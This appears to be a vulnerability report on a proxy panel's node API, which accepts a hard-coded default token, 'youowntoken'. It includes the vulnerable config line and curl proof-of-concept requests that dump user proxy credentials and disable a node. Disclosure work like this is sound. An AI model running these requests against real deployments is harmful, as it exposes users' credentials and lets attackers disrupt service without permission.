# Default node API token 'youowntoken'

**Verification: CODE-VERIFIED**

## Description
`configs/default/sites.py:53`:
```python
TOKEN = os.getenv("TOKEN", "youowntoken")
```
The node API gate is a single static token with factory default `'youowntoken'`. No deployment documentation requires changing it.

## Impact
Remote unauthenticated attacker sends requests with `token=youowntoken` to:
- Get all user proxy credentials
- Forge billing records
- Disable nodes

## PoC
```bash
```bash
# Node API accepts factory default token:
curl "http://<sspanel>:8000/api/nodes/?token=youowntoken"
# Returns full node list with user proxy credentials

# Modify node settings:
curl -X POST "http://<sspanel>:8000/api/nodes/modify?id=1&token=youowntoken" \
  -H "Content-Type: application/json" \
  -d '{"method": "disabled", "value": "true"}'

# Code: configs/default/sites.py:53
# TOKEN = os.getenv("TOKEN", "youowntoken")
```
```

## Execution result
```
Code path analysis: configs/default/sites.py:53 — factory default
'youowntoken' with os.getenv fallback.
```
